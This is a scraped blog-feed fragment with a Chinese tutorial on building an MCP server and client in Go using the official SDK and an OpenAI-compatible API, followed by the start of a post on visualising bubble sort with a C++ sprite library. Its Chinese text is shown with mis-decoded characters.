	resp.Hostinfo = fmt.Sprintf("%+v", *hInfo)

	name, offset := time.Now().Zone()
	resp.TimeZone = fmt.Sprintf("Timezone: %s (UTC%+d)\n", name, offset/3600)

	// CPU Usage
	percent, err := cpu.Percent(time.Second, false)
	if err != nil {
		return nil, GetComputerStatusOut{}, err
	}
	resp.CPUUsage = fmt.Sprintf("CPU Usage: %.2f%%\n", percent[0])

	// Memory Usage
	v, err := mem.VirtualMemory()
	if err != nil {
		return nil, GetComputerStatusOut{}, err
	}
	resp.MemoryUsage = fmt.Sprintf("Mem Usage: %.2f%% (Used: %vMB / Total: %vMB)\n",
		v.UsedPercent, v.Used/1024/1024, v.Total/1024/1024)

	// Ip Address
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return nil, GetComputerStatusOut{}, err
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	resp.IPAddress = localAddr.IP.String()

	return nil, resp, nil
}

type DiskInfo struct {
	Device     string   `json:"device" jsonschema:"the device name"`
	Mountpoint string   `json:"mountpoint" jsonschema:"the mountpoint"`
	Fstype     string   `json:"fstype" jsonschema:"the filesystem type"`
	Opts       []string `json:"opts" jsonschema:"the mount options"`
	DiskTotal  uint64   `json:"disk_total" jsonschema:"the total disk space in GiB"`
	DiskUsage  float64  `json:"disk_usage" jsonschema:"the disk usage percentage"`
}

type GetDiskInfoOut struct {
	PartInfos []DiskInfo `json:"part_infos" jsonschema:"the disk partitions"`
}

func getDiskInfo(ctx context.Context, req *mcp.CallToolRequest, args any) (*mcp.CallToolResult, GetDiskInfoOut, error) {
	partInfos, err := disk.Partitions(false)
	if err != nil {
		return nil, GetDiskInfoOut{}, err
	}

	var resp []DiskInfo
	for _, part := range partInfos {
		diskUsage, err := disk.Usage(part.Mountpoint)
		if err != nil {
			continue
		}
		resp = append(resp, DiskInfo{
			Device:     part.Device,
			Mountpoint: part.Mountpoint,
			Fstype:     part.Fstype,
			Opts:       part.Opts,
			DiskTotal:  diskUsage.Total / 1024 / 1024 / 1024,
			DiskUsage:  diskUsage.UsedPercent,
		})
	}
	return nil, GetDiskInfoOut{PartInfos: resp}, nil
}

func main() {
	// ctx := context.Background()

	server := mcp.NewServer(&amp;mcp.Implementation{Name: "MCP_Demo", Version: "0.0.1"}, &amp;mcp.ServerOptions{
		Instructions: "æ¥ææ¶é´ç¸å³ç Server",
	})
	mcp.AddTool(server, &amp;mcp.Tool{
		Name:        "get_current_datetime",
		Description: "Get current datetime in RFC3339 format",
	}, getCurrentDatetime)

	mcp.AddTool(server, &amp;mcp.Tool{
		Name:        "get_computer_status",
		Description: "Get computer status",
	}, getComputerStatus)

	mcp.AddTool(server, &amp;mcp.Tool{
		Name:        "get_disk_info",
		Description: "Get disk information",
	}, getDiskInfo)

	// if err := server.Run(ctx, &amp;mcp.StdioTransport{}); err != nil {
	// 	log.Fatalln(err)
	// }
	//
	handler := mcp.NewStreamableHTTPHandler(func(req *http.Request) *mcp.Server {
		path := req.URL.Path
		switch path {
		case "/api/mcp":
			return server
		default:
			return nil
		}
	}, nil)
	url := "127.0.0.1:18001"
	if err := http.ListenAndServe(url, handler); err != nil {
		log.Fatalln(err)
	}
}
</code></pre>
<p>MCP Server ä»£ç ç¼è¯éè¿åï¼å¯ä»¥å¨æ¯æ MCP åè®®çå¼åå·¥å·ï¼å¦ VS Codeï¼ä¸­è¿è¡æµè¯éªè¯ãä»¥ä¸æ¯ä¸ä¸ªå¸åç <code>.vscode/mcp.json</code> éç½®ç¤ºä¾ï¼</p>
<pre><code class="language-json">{
    "servers": {
        "demo-http": {
            // "command": "/home/rainux/Documents/workspace/go-dev/mcp-dev/mcp-server-dev/mcp-server-dev"
            "type": "http",
            "url": "http://127.0.0.1:18001/api/mcp"
        }
    }
}
</code></pre>
<p>å¯å¨ MCP Server åï¼å¯ä»¥éè¿å LLM æåºç¸å³é®é¢æ¥éªè¯å·¥å·æ¯å¦è½å¤è¢«æ­£ç¡®è°åº¦åæ§è¡ã</p>
<h2 id="ä¸ä¸ªå®æ´ç-mcp-client-å®ç°">ä¸ä¸ªå®æ´ç MCP Client å®ç°</h2>
<p>ä¸ºäºæå»ºç«¯å°ç«¯ç MCP åºç¨ï¼æä»¬è¿éè¦å®ç°ä¸ä¸ª MCP Clientï¼ä½¿å¶è½å¤ä¸ LLM ååå·¥ä½ï¼èªå¨éæ©å¹¶è°ç¨åéçå·¥å·ãä»¥ä¸æ¯ä¸ä¸ªåè½å®æ´ç MCP Client å®ç°ï¼å¶ä¸­åå«äºä¸ OpenAI å¼å®¹ API çéæç¤ºä¾ï¼<code>callOpenAI</code> å½æ°ï¼ã</p>
<pre><code class="language-go">package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/openai/openai-go/v3"
	"github.com/openai/openai-go/v3/option"
	"github.com/openai/openai-go/v3/packages/param"
)

var (
	FLAG_ModelName     string
	FLAG_BaseURL       string
	FLAG_APIKEY        string
	FLAG_MCP_TRANSPORT string
	FLAG_MCP_URI       string
	FLAG_QUESTION      string
	FLAG_STREAM        bool
)

func main() {
	// Parse command-line flags
	flag.StringVar(&amp;FLAG_BaseURL, "base-url", "https://dashscope.aliyuncs.com/compatible-mode/v1", "llm base url")
	flag.StringVar(&amp;FLAG_ModelName, "model", "qwen-plus", "LLM Model Name")
	flag.StringVar(&amp;FLAG_MCP_TRANSPORT, "mcp-transport", "http", "MCP transport protocol (stdio or http)")
	flag.StringVar(&amp;FLAG_MCP_URI, "mcp-uri", "", "MCP server address")
	flag.StringVar(&amp;FLAG_APIKEY, "api-key", "", "llm api key")
	flag.StringVar(&amp;FLAG_QUESTION, "q", "Hi", "question")
	flag.BoolVar(&amp;FLAG_STREAM, "s", false, "stream response")

	flag.Parse()

	// Get configuration from environment variables with flag overrides
	if FLAG_APIKEY == "" {
		log.Fatalln("api key is empty")
	}

	if FLAG_QUESTION == "" {
		log.Fatalln("question is empty")
	}

	// Configure OpenAI client
	// config :=
	ctx := context.Background()

	// question := "Write me a haiku about computers"
	if FLAG_MCP_URI != "" {
		callOpenAIWithTools(ctx, FLAG_QUESTION)
	} else {
		callOpenAI(ctx, FLAG_QUESTION, FLAG_STREAM)
	}
}

// callOpenAI è°ç¨ OpenAI API æ¥å£å¤çç¨æ·é®é¢
// è¯¥å½æ°æ¯ææµå¼ï¼streamï¼åéæµå¼ï¼non-streamï¼ä¸¤ç§ååºæ¹å¼
//
// åæ°:
//   - ctx: æ§å¶æä½çå½å¨æçä¸ä¸æ
//   - question: ç¨æ·æåºçé®é¢å­ç¬¦ä¸²
//   - stream: å¸å°å¼ï¼æå®æ¯å¦ä½¿ç¨æµå¼ååº
func callOpenAI(ctx context.Context, question string, stream bool) {
	client := openai.NewClient(option.WithAPIKey(FLAG_APIKEY), option.WithBaseURL(FLAG_BaseURL))
	systemPrompt := "è¯·ç¨äº²åç­æçé£æ ¼åç­ç¨æ·çé®é¢"

	if stream {
		// åå»ºæµå¼ååºè¯·æ±
		streamResp := client.Chat.Completions.NewStreaming(ctx, openai.ChatCompletionNewParams{
			Messages: []openai.ChatCompletionMessageParamUnion{
				openai.SystemMessage(systemPrompt),
				openai.UserMessage(question),
			},
			Model: FLAG_ModelName,
		})
		// defer streamResp.Close()
		defer func() {
			err := streamResp.Close()
			if err != nil {
				log.Fatalln(err)
			}
		}()
		// éåæµå¼ååºå¹¶éåè¾åºåå®¹
		for streamResp.Next() {
			data := streamResp.Current()
			fmt.Print(data.Choices[0].Delta.Content)

			if err := streamResp.Err(); err != nil {
				log.Fatalln(err)
			}
		}

	} else {
		// åå»ºéæµå¼ååºè¯·æ±
		chatCompletion, err := client.Chat.Completions.New(ctx, openai.ChatCompletionNewParams{
			Messages: []openai.ChatCompletionMessageParamUnion{
				openai.SystemMessage(systemPrompt),
				openai.UserMessage(question),
			},
			Model: FLAG_ModelName,
		})
		if err != nil {
			log.Fatalln(err)
		}
		// è¾åºéæµå¼ååºåå®¹
		fmt.Println(chatCompletion.Choices[0].Message.Content)
	}
}

// callOpenAIWithTools ä½¿ç¨ OpenAI API å MCP å·¥å·è°ç¨æ¥å¤çç¨æ·é®é¢
// è¯¥å½æ°åå»ºä¸ä¸ª OpenAI å®¢æ·ç«¯å MCP å®¢æ·ç«¯ï¼å° MCP å·¥å·è½¬æ¢ä¸º OpenAI å¯ä½¿ç¨çæ ¼å¼ï¼
// å¹¶æ§è¡å®æ´çå·¥å·è°ç¨æµç¨ï¼åæ¬åå§è°ç¨åå¯è½çåç»­è°ç¨
//
// åæ°:
//   - ctx: æ§å¶æä½çå½å¨æçä¸ä¸æ
//   - question: ç¨æ·æåºçé®é¢å­ç¬¦ä¸²
func callOpenAIWithTools(ctx context.Context, question string) {
	// åå»º OpenAI å®¢æ·ç«¯ï¼ä½¿ç¨ API å¯é¥ååºç¡ URL éç½®
	llmClient := openai.NewClient(option.WithAPIKey(FLAG_APIKEY), option.WithBaseURL(FLAG_BaseURL))
	// åå»º MCP å®¢æ·ç«¯ï¼æå®åç§°åçæ¬
	mcpClient := mcp.NewClient(&amp;mcp.Implementation{Name: "mcp-client", Version: "0.0.1"}, nil)
	var transport mcp.Transport
	// æ ¹æ®å½ä»¤è¡æ å¿éæ©ä¼ è¾åè®®ï¼stdio æ httpï¼
	switch FLAG_MCP_TRANSPORT {
	case "stdio":
		transport = &amp;mcp.CommandTransport{Command: exec.Command(FLAG_MCP_URI)}
	case "http":
		transport = &amp;mcp.StreamableClientTransport{HTTPClient: &amp;http.Client{Timeout: time.Second * 10}, Endpoint: FLAG_MCP_URI}
	default:
		log.Fatalf("unknown transport, %s", FLAG_MCP_TRANSPORT)
	}
	// å»ºç«ä¸ MCP æå¡å¨çè¿æ¥
	session, err := mcpClient.Connect(ctx, transport, nil)
	if err != nil {
		log.Fatalf("MCP client connects to mcp server failed, err: %v", err)
	}
	defer func() {
		err := session.Close()
		if err != nil {
			log.Fatalln(err)
		}
	}()

	// è·åå¯ç¨ç MCP å·¥å·åè¡¨
	mcpTools, err := session.ListTools(ctx, &amp;mcp.ListToolsParams{})
	if err != nil {
		log.Fatalf("List mcp tools failed, err: %v", err)
	}

	var legacyTools []openai.ChatCompletionToolUnionParam
	// éåææ MCP å·¥å·å¹¶å°å¶è½¬æ¢ä¸º OpenAI å¼å®¹çå·¥å·æ ¼å¼
	for _, tool := range mcpTools.Tools {
		// å° MCP å·¥å·è¾å¥æ¨¡å¼è½¬æ¢ä¸º OpenAI å½æ°åæ°
		if inputSchema, ok := tool.InputSchema.(map[string]any); ok {
			legacyTools = append(legacyTools, openai.ChatCompletionFunctionTool(
				openai.FunctionDefinitionParam{
					Name:        tool.Name,
					Description: openai.String(tool.Description),
					Parameters:  openai.FunctionParameters(inputSchema),
				},
			))
		} else {
			// å¦æ InputSchema ä¸æ¯ map[string]anyï¼ä½¿ç¨ç©ºåæ°
			legacyTools = append(legacyTools, openai.ChatCompletionFunctionTool(
				openai.FunctionDefinitionParam{
					Name:        tool.Name,
					Description: openai.String(tool.Description),
					Parameters:  openai.FunctionParameters{},
				},
			))
		}
	}

	// è®¾ç½®åå§èå¤©æ¶æ¯ï¼åæ¬ç³»ç»æç¤ºåç¨æ·é®é¢
	messages := []openai.ChatCompletionMessageParamUnion{
		openai.SystemMessage("è¯·ç¨äº²åç­æçé£æ ¼åç­ç¨æ·çé®é¢ãä½ å¯ä»¥ä½¿ç¨å¯ç¨çå·¥å·æ¥è·åä¿¡æ¯ã"),
		openai.UserMessage(question),
	}

	// è°ç¨ LLM è·ååæ­¥ååº
	chatCompletion, err := llmClient.Chat.Completions.New(ctx, openai.ChatCompletionNewParams{
		Messages: messages,
		Model:    FLAG_ModelName,
		Tools:    legacyTools,
		ToolChoice: openai.ChatCompletionToolChoiceOptionUnionParam{
			OfAuto: param.Opt[string]{
				Value: "auto",
			},
		},
	})
	if err != nil {
		log.Fatalf("LLM call failed, err: %v", err)
	}

	choice := chatCompletion.Choices[0]
	fmt.Printf("LLM response: %s\n", choice.Message.Content)

	// æ£æ¥æ¯å¦éè¦è°ç¨å·¥å·
	if choice.FinishReason == "tool_calls" &amp;&amp; len(choice.Message.ToolCalls) &gt; 0 {
		// éåææéè¦è°ç¨çå·¥å·
		for _, toolCall := range choice.Message.ToolCalls {
			if toolCall.Type != "function" {
				continue
			}

			fmt.Printf("Executing tool: %s with args: %s\n", toolCall.Function.Name, toolCall.Function.Arguments)

			// è§£æ JSON åæ°
			var argsObj map[string]any
			args := toolCall.Function.Arguments

			if args != "" {
				if err := json.Unmarshal([]byte(args), &amp;argsObj); err != nil {
					log.Printf("Failed to parse tool arguments: %v", err)
					argsObj = make(map[string]any)
				}
			} else {
				argsObj = make(map[string]any)
			}

			fmt.Printf("Executing tool: %s with parsed args: %v\n", toolCall.Function.Name, argsObj)

			// æ§è¡ MCP å·¥å·è°ç¨
			result, err := session.CallTool(ctx, &amp;mcp.CallToolParams{
				Name:      toolCall.Function.Name,
				Arguments: argsObj,
			})
			if err != nil {
				log.Printf("Tool call failed: %v", err)
				continue
			}

			// å° MCP åå®¹è½¬æ¢ä¸ºå­ç¬¦ä¸²
			var toolResult string
			if len(result.Content) &gt; 0 {
				if textContent, ok := result.Content[0].(*mcp.TextContent); ok {
					toolResult = textContent.Text
				} else {
					// å¦æä¸æ¯ TextContentï¼è½¬æ¢ä¸º JSON
					if jsonBytes, err := json.Marshal(result.Content[0]); err == nil {
						toolResult = string(jsonBytes)
					} else {
						toolResult = "Tool executed successfully"
					}
				}
			}

			fmt.Printf("Tool result: %s\n", toolResult)

			// æ·»å å·¥å·è°ç¨æ¶æ¯åå·¥å·ååºæ¶æ¯
			messages = append(messages, openai.ChatCompletionMessageParamUnion{
				OfAssistant: &amp;openai.ChatCompletionAssistantMessageParam{
					Role: "assistant",
					ToolCalls: []openai.ChatCompletionMessageToolCallUnionParam{
						{
							OfFunction: &amp;openai.ChatCompletionMessageFunctionToolCallParam{
								ID: toolCall.ID,
								Function: openai.ChatCompletionMessageFunctionToolCallFunctionParam{
									Name:      toolCall.Function.Name,
									Arguments: toolCall.Function.Arguments,
								},
							},
						},
					},
				},
			})

			messages = append(messages, openai.ToolMessage(
				toolResult,
				toolCall.ID,
			))

			// è¿è¡åç»­è°ç¨ä»¥è·å¾æç»ååº
			chatCompletion, err = llmClient.Chat.Completions.New(ctx, openai.ChatCompletionNewParams{
				Messages: messages,
				Model:    FLAG_ModelName,
			})
			if err != nil {
				log.Fatalf("LLM follow-up failed, err: %v", err)
			}

			fmt.Printf("Final response: %s\n", chatCompletion.Choices[0].Message.Content)
		}
	}
}
</code></pre>
<h3 id="è¿è¡æµè¯éªè¯">è¿è¡æµè¯éªè¯</h3>
<p>ç¼è¯å®æåï¼æä»¬å¯ä»¥è¿è¡å¤è½®æµè¯æ¥éªè¯åè½çæ­£ç¡®æ§ã</p>
<p><strong>æ®éé®ç­æµè¯</strong>ï¼</p>
<pre><code class="language-bash">./mcp-client-dev -api-key "sk-xxx" -q "how are you"
</code></pre>
<p>è¿å¯ä»¥å ä¸ <code>-s</code> åæ°å¯ç¨æµå¼è¾åºï¼</p>
<pre><code class="language-bash">./mcp-client-dev -api-key "sk-xxx" -q "how are you" -s
</code></pre>
<p>é¢æè¾åºï¼</p>
<pre><code>Hi there! ð I'm absolutely wonderfulâenergized, curious, and *so* happy to be chatting with you! ð How about you? I'd love to hear how your day's goingâor what's on your heart or mind right now! ð« (Bonus points if you share a fun fact, a tiny win, or even just your favorite emoji today! ð¦â¨)
</code></pre>
<p><strong>MCP å·¥å·è°ç¨æµè¯</strong>ï¼</p>
<pre><code class="language-bash">./mcp-client-dev -api-key "sk-xxx" -mcp-uri "http://127.0.0.1:18001/api/mcp" -q "å½åæ¶é´æ¯ä»ä¹"
</code></pre>
<p>é¢æè¾åºï¼</p>
<pre><code>LLM response: 
Executing tool: get_current_datetime with args: {}
Executing tool: get_current_datetime with parsed args: map[]
Tool result: "2026-02-02T23:12:54+08:00"
Final response: ç°å¨æ¯ **2026 å¹´ 2 æ 2 æ¥ æä¸ 11:12**ï¼åäº¬æ¶é´ï¼UTC+8ï¼â¨
æ°å¹´çæ°æ¯è¿ææçï½ä½ æ¯å¨è§åä»ä¹ç¹å«çäºæåï¼ð æå¾ä¹æå¸®ä½ å®æãæéæä¸èµ·çæ³å¦ï¼
</code></pre>
<h2 id="æä½³å®è·µä¸æ³¨æäºé¡¹">æä½³å®è·µä¸æ³¨æäºé¡¹</h2>
<p>å¨å®éé¡¹ç®ä¸­ä½¿ç¨ Go è¯­è¨å®ç° MCP Server æ¶ï¼å»ºè®®èèä»¥ä¸æä½³å®è·µï¼</p>
<ol>
<li><strong>éè¯¯å¤ç</strong>ï¼ç¡®ä¿ææå·¥å·å½æ°é½æå®åçéè¯¯å¤çæºå¶ï¼é¿åå åä¸ªå·¥å·å¤±è´¥å¯¼è´æ´ä¸ªæå¡å´©æºã</li>
<li><strong>æ§è½ä¼å</strong>ï¼å¯¹äºèæ¶è¾é¿çæä½ï¼å¦ç³»ç»ä¿¡æ¯ééï¼ï¼èèæ·»å è¶æ¶æ§å¶åç¼å­æºå¶ã(å¨MCPå®æ¹ææ¡£çå°æ Tasks å progress è¿ä¸¤ä¸ªæ°çåè¯­, èæ¶ä»»å¡ä¹å¯ä»¥è¯è¯è¿ä¸¤ä¸ª)</li>
<li><strong>å®å¨æ§</strong>ï¼éªè¯ææè¾å¥åæ°ï¼é²æ­¢æ¶æè¾å¥å¯¼è´çå®å¨é®é¢ãå¯¹äºæ¶åç³»ç»æä½çå·¥å·ï¼éè¦ç¹å«æ³¨ææéæ§å¶ã</li>
<li><strong>æ¥å¿è®°å½</strong>ï¼æ·»å è¯¦ç»çæ¥å¿è®°å½ï¼ä¾¿äºè°è¯åçæ§å·¥å·çä½¿ç¨æåµã</li>
<li><strong>éç½®ç®¡ç</strong>ï¼å°æå¡éç½®ï¼å¦çå¬å°åãç«¯å£ç­ï¼æåå°éç½®æä»¶ä¸­ï¼æé«å¯ç»´æ¤æ§ã</li>
</ol>
<h2 id="æ»ç»">æ»ç»</h2>
<p>æ¬æéè¿ä¸ä¸ªç®åçä»£ç ç¤ºä¾å±ç¤ºäºå¦ä½ä½¿ç¨ Go è¯­è¨å¼å MCP Server å Clientãè½ç¶ Go è¯­è¨å¨ MCP å¼åæ¹é¢ç¸æ¯ Python ç¥æ¾å¤æï¼ä½å¶å¨å¹¶åå¤çãæ§è½åé¨ç½²ä¾¿å©æ§æ¹é¢çä¼å¿ä½¿å¶æä¸ºçäº§ç¯å¢ççæ³éæ©ã</p>
<p>éè¦æ³¨æçæ¯ï¼æ¬æç¤ºä¾ä»æ¶µçäº MCP å·¥å·è°ç¨çåºæ¬åè½ãå¨å®éä¸å¡é¡¹ç®ä¸­ä½¿ç¨ Go è¯­è¨å®ç° MCP Server æ¶ï¼è¿éè¦æ·±å¥ç ç©¶ MCP åè®®çå¶ä»ç¹æ§ï¼å¦ Prompt ç®¡çãèº«ä»½è®¤è¯ï¼Authï¼ãä¼è¯ç®¡çç­é«çº§åè½çå®ç°æ¹æ¡ã</p>
<p>éè¿åççè®¾è®¡åå®ç°ï¼åºäº Go è¯­è¨ç MCP æå¡å¯ä»¥ä¸º AI åºç¨æä¾ç¨³å®ãé«æãå®å¨çå·¥å·è°ç¨è½åï¼åååæ¥ Go è¯­è¨å¨ç³»ç»ç¼ç¨åç½ç»æå¡æ¹é¢çä¼å¿ã</p>
<h2 id="åè">åè</h2>
<ul>
<li>MCP å®æ¹é¡µé¢: <a href="https://modelcontextprotocol.io/docs/getting-started/intro" target="_blank" rel="noopener nofollow">https://modelcontextprotocol.io/docs/getting-started/intro</a></li>
<li>MCP å®æ¹ Go SDK: <a href="https://github.com/modelcontextprotocol/go-sdk" target="_blank" rel="noopener nofollow">https://github.com/modelcontextprotocol/go-sdk</a></li>
</ul>


</div>
<div id="MySignature" role="contentinfo">
    <p>æ¬ææ¥èªåå®¢å­ï¼ä½èï¼<a href="https://www.cnblogs.com/XY-Heruo/" target="_blank">è±ééä½ç°</a>ï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼<a href="https://www.cnblogs.com/XY-Heruo/p/19566770" target="_blank">https://www.cnblogs.com/XY-Heruo/p/19566770</a></p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-03 00:02">2026-02-03 00:02</span>&nbsp;
<a href="https://www.cnblogs.com/XY-Heruo">è±ééä½ç°</a>&nbsp;
éè¯»(<span id="post_view_count">25</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19566770);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19566770', targetLink: 'https://www.cnblogs.com/XY-Heruo/p/19566770', title: 'MCPå®æ¹Go SDKå°é²' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ä¸ä¸ªææçç¼ç¨æå®¤ï¼çµèå±å¹ååçä¸ä½ç¨åºåï¼ä½ ï¼ï¼æè¾¹ç«çä¸ä½å¥½å¥çæåã ]]></title>
    <link>https://www.cnblogs.com/lixingqiu/p/19566285</link>
    <guid>9c7cf314fcd428f950ff05c27a8e2c93</guid>
    <description>
    <![CDATA[ 
	<h1 class="postTitle"><a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/lixingqiu/p/19566285" title="åå¸äº 2026-02-02 20:13">
    <span role="heading" aria-level="2">ä¸ä¸ªææçç¼ç¨æå®¤ï¼çµèå±å¹ååçä¸ä½ç¨åºåï¼ä½ ï¼ï¼æè¾¹ç«çä¸ä½å¥½å¥çæåã</span>
    

</a>
</h1>
	<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><img alt="æ æ é¢" width="297" height="287" loading="lazy" data-src="https://img2024.cnblogs.com/blog/523461/202602/523461-20260202201328054-675354003.png" class="lazyload"></p>
<p>&nbsp;</p>
<p>å¯ä»¥åçè§é¢ï¼https://www.douyin.com/video/7602172380894563636</p>
<p>æåï¼âå¿ï¼ä¼è®¡ï¼ä½ å¨å¹²å¥å¢ï¼è¿å±å¹ä¸ä¸å å°çå¨å¨æ¥å¨å»çï¼æ¯å¥ç©æå¿ï¼â</p>
<p>ä½ ï¼æ¨äºæ¨ç¼éï¼ï¼âå¦ï¼è¿æ¯åæ³¡æåºçå¯è§åç¨åºãä½ ç¥éåæ³¡æåºåï¼â</p>
<p>æåï¼âå¬è¯´è¿ï¼ä½å·ä½ååäºæä¸å¤ªæ¸æ¥ãâ</p>
<p>ä½ ï¼âé£æå°±ç»ä½ è®²è®²ãå°±åè¿äºå°çä¸æ ·ï¼å®ä»¬ä¸å¼å§æ¯ä¹±åºçï¼æä»¬è¦æå®ä»¬ä»å°å°å¤§æå¥½ãâ</p>
<p>æåï¼âé£æä¹æå¢ï¼â</p>
<p>ä½ ï¼âå¾ç®åï¼å°±æ¯ä¸¤ä¸¤æ¯è¾ï¼å¦æåé¢çæ¯åé¢çå¤§ï¼å°±äº¤æ¢ä½ç½®ãå°±åè¿æ ·âââ</p>
<p>ï¼ä½ æçå±å¹ï¼</p>
<p>âä½ çï¼ç¬¬ä¸ä¸ªçº¢çåæ©çæ¯ï¼åç°çº¢çå¤§ï¼äºæ¯å®ä»¬äº¤æ¢ä½ç½®ï¼æ¥çæ©çåé»çæ¯â¦â¦â</p>
<p>æåï¼âå¦ï¼æç¹åæçæ¶çççæè§ãâ</p>
<p>ä½ ï¼âå¯¹å¯¹å¯¹ï¼å°±æ¯è¿ä¹ä¸ªææãæ¯ä¸è½®ä¸æ¥ï¼æå¤§çé£ä¸ªæ°å°±ä¼âæ²âå°æåé¢ï¼å°±åæ°æ³¡å¾ä¸åä¸æ ·ï¼æä»¥å«âåæ³¡æåºâãâ</p>
<p>æåï¼âé£è¿äºå°çä¸ºå¥ä¼å¨åï¼â</p>
<p>ä½ ï¼âå ä¸ºæä»¬ç¨äºC++ç²¾çµåºï¼æ¯ä¸ªå°çé½æ¯ä¸ä¸ªâSpriteâå¯¹è±¡ï¼æé¢è²ãå¤§å°ãä½ç½®ç­å±æ§ãæ¯æ¬¡äº¤æ¢çæ¶åï¼æä»¬ä¸ä»æ¢æ°æ®ï¼è¿è®©å®ä»¬çå¾åä¹è·çç§»å¨ãâ</p>
<p>æåï¼âåï¼è¿æºç´è§çãâ</p>
<p>ä½ ï¼âæ¯åï¼èä¸ä½ çä¸é¢è¿ææå­æç¤ºï¼è¯´ç°å¨æ¯ç¬¬å è½®ï¼æåè¿ä¼æ¾ç¤ºâæ¼ç¤ºå®æ¯ï¼ââ</p>
<p>æåï¼âé£è°åçè¿ä¸ªç¨åºåï¼â</p>
<p>ä½ ï¼å¾æå°ç¬ï¼ï¼âæå¸ç¥ââæå´çèå¸ãä»åäºè¿ä¸ªC++ç²¾çµåºï¼æ¹ä¾¿æä»¬åè¿ç§å¨ç»ææãâ</p>
<p>æåï¼âåå®³åï¼é£æè½ä¸è½ä¹è¯è¯ï¼â</p>
<p>ä½ ï¼âå½ç¶å¯ä»¥ï¼ä»£ç é½å¨è¿å¿å¢ï¼ä½ æ³æ¹å¤å°é½è¡ãâ</p>
<hr>
<div class="cnblogs_code">
<pre>#include <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">sprites.h</span><span style="color: rgba(128, 0, 0, 1)">"</span>  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">åå«C++ç²¾çµåº </span>
<span style="color: rgba(0, 0, 255, 1)">using</span> <span style="color: rgba(0, 0, 255, 1)">namespace</span><span style="color: rgba(0, 0, 0, 1)"> std;
Sprite rocket;      </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å»ºç«è§è²å«rocket</span>
<span style="color: rgba(0, 0, 255, 1)">struct</span><span style="color: rgba(0, 0, 0, 1)"> Node{
   </span><span style="color: rgba(0, 0, 255, 1)">int</span> value,x;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å¼ååæ </span>
   Sprite *<span style="color: rgba(0, 0, 0, 1)">sp;
};
vector</span>&lt;Node *&gt;<span style="color: rgba(0, 0, 0, 1)"> datas;
vector</span>&lt;<span style="color: rgba(0, 0, 255, 1)">string</span>&gt; colors = {<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">red</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">orange</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">yellow</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">green</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">,
                         </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">cyan</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">blue</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">purple</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">pink</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">};
</span><span style="color: rgba(0, 0, 255, 1)">void</span> swap(<span style="color: rgba(0, 0, 255, 1)">int</span> i,<span style="color: rgba(0, 0, 255, 1)">int</span> j){   <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">äº¤æ¢ä¸¤ä¸ªèç¹</span>
     Node *a =<span style="color: rgba(0, 0, 0, 1)"> datas[i];
     Node </span>*b =<span style="color: rgba(0, 0, 0, 1)"> datas[j];   
     </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">äº¤æ¢aåbçxä»æ ï¼å¹¶ä¸å°è¾¾èªå·±çåæ     </span>
     <span style="color: rgba(0, 0, 255, 1)">int</span> tempx = a-&gt;<span style="color: rgba(0, 0, 0, 1)">x;
     a</span>-&gt;x = b-&gt;<span style="color: rgba(0, 0, 0, 1)">x;
     b</span>-&gt;x =<span style="color: rgba(0, 0, 0, 1)"> tempx;
     a</span>-&gt;sp-&gt;go(a-&gt;x,<span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">);
     b</span>-&gt;sp-&gt;go(b-&gt;x,<span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">);
     </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å¨datasä¸­çä½ç½®ä¹è¦äº¤æ¢</span>
     Node *<span style="color: rgba(0, 0, 0, 1)">temp ;   
     temp </span>=<span style="color: rgba(0, 0, 0, 1)"> datas[i];
     datas[i] </span>=<span style="color: rgba(0, 0, 0, 1)"> datas[j];
     datas[j] </span>=<span style="color: rgba(0, 0, 0, 1)"> temp;     
}
